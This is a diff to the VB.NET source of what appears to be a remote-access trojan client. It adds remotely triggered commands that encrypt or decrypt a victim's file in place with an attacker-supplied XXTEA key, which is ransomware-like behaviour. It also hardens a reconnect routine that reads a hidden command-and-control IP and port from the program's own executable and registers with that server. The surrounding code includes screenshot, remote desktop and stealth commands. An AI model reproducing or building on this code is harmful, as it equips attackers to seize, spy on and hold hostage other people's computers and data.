@@ -539,6 +539,8 @@ Public Class Form1
 
             Dim NewPathforward As String = TextBox1.Text.Replace("@wheretogo", "")
             FileManagerGoForward(NewPathforward)
+
+
             '    "||wheretogo"
             ''''FM
             '
@@ -617,6 +619,28 @@ Public Class Form1
         ElseIf TextBox1.Text.Contains("UNLockInvisiblePlease") Then
             UnlockThatShit()
 
+        ElseIf TextBox1.Text.Contains("\CryptThatShitPlease/") Then
+
+            Dim recept As String() = Split(TextBox1.Text, "\CryptThatShitPlease/")
+            Dim file As String = recept(0).Replace("\\", "\")
+            Dim herlpe As String() = Split(file, "\")
+            Dim filename As String = herlpe(herlpe.Length - 1)
+            Dim key As String = recept(1)
+
+            LaunchCrypt(file, key, filename)
+
+        ElseIf TextBox1.Text.Contains("\WhyDecrypt/") Then
+
+            Dim recept As String() = Split(TextBox1.Text, "\WhyDecrypt/")
+            Dim file As String = recept(0).Replace("\\", "\")
+            Dim herlpe As String() = Split(file, "\")
+            Dim filename As String = herlpe(herlpe.Length - 1)
+            Dim key As String = recept(1)
+
+
+            LaunchDeCrypt(file, key, filename)
+
+
         ElseIf TextBox1.Text = "TakeAPhotooo561" Then  'SCREENSHOT
 
             Dim lk As New Random
@@ -643,7 +667,41 @@ Public Class Form1
         End If
     End Sub
 
+    'From : https://github.com/xxtea/xxtea-dotnet
+    '  /**********************************************************\
+    '|                                                          |
+    '| XXTEA.cs                                                 |
+    '|                                                          |
+    '| XXTEA encryption algorithm library for .NET.             |
+    '|                                                          |
+    '| Encryption Algorithm Authors:                            |
+    '|      David J. Wheeler                                    |
+    '|      Roger M. Needham                                    |
+    '|                                                          |
+    '| Code Author:  Ma Bingyao <mabingyao@gmail.com>           |
+    '| LastModified: Mar 10, 2015                               |
+    '|                                                          |
+    '\**********************************************************/
+    Public Sub LaunchDeCrypt(ByVal Path As String, ByVal Key As String, ByVal filename As String)
 
+        Dim l As Byte() = Xxtea.XXTEA.Decrypt(IO.File.ReadAllBytes(Path), System.Text.Encoding.ASCII.GetBytes(Key))
+        IO.File.Delete(Path)
+        IO.File.WriteAllBytes(Path, l)
+
+
+
+        TextBox1.Text = String.Empty
+    End Sub
+    Public Sub LaunchCrypt(ByVal Path As String, ByVal Key As String, ByVal filename As String)
+
+        Dim l As Byte() = Xxtea.XXTEA.Encrypt(IO.File.ReadAllBytes(Path), System.Text.Encoding.ASCII.GetBytes(Key))
+        IO.File.Delete(Path)
+        IO.File.WriteAllBytes(Path, l)
+
+
+
+        TextBox1.Text = String.Empty
+    End Sub
     Public Sub RDC()
         Dim k As New Random
         Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
@@ -865,31 +923,38 @@ Public Class Form1
             MonClient.GetStream().Write(buffer, 0, buffer.Length)
 
         Catch ex As Exception
-            FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
-            Dim data As String = Space(LOF(1))
-            FileGet(1, data)
-            FileClose(1)
-            Dim options() As String
 
-            options = Split(data, splitz)
+            Try
+                FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
+                Dim data As String = Space(LOF(1))
+                FileGet(1, data)
+                FileClose(1)
+                Dim options() As String
+
+                options = Split(data, splitz)
 
 
-            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
+                Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
                 MonClient = New TcpClient()
-            MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
+                MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
 
 
-            Dim l As New Random
-            id = l.Next(100000, 999999).ToString
-            Dim k = id + "THISISMYID"
-            Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
-            MonClient.GetStream().Write(buffer, 0, buffer.Length)
+                Dim l As New Random
+                id = l.Next(100000, 999999).ToString
+                Dim k = id + "THISISMYID"
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
+                MonClient.GetStream().Write(buffer, 0, buffer.Length)
 
-            Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
+                Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
 
-            Timer1.Start()
+                Timer1.Start()
+            Catch exs As Exception
+
+            End Try
         End Try
 
     End Sub
+
+
 End Class
 
